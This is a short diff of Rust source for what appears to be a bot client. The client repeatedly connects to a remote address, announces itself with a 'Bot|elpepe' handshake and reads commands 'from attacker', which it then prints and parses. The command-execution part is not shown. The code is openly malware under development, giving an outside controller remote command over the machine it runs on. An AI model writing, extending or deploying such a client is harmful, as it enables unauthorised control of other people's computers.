@@ -23,7 +23,8 @@ struct Args {
 async fn connect(addr: String) -> TcpStream {
     loop {
         match TcpStream::connect(addr.clone()).await {
-            Ok(socket) => {
+            Ok(mut socket) => {
+                socket.write_all(b"Bot|elpepe").await.unwrap();
                 println!("[MESSAGE] => Connection established successfuly");
                 return socket;
             }
@@ -66,6 +67,9 @@ async fn handler_order(mut socket: TcpStream) {
     loop {
         // get the command from attacker
         let n = match socket.read(&mut buffer_command).await {
+            Ok(n) if n == 0 => {
+                continue;
+            }
             Ok(n) => n,
             Err(e) => {
                 eprintln!("{:?}", e);
@@ -78,6 +82,8 @@ async fn handler_order(mut socket: TcpStream) {
         };
 
         let command_data = String::from_utf8_lossy(&buffer_command[..n]);
+
+        println!("elpepe: {command_data}");
 
 
         // parsing the command into the main command and its arguments
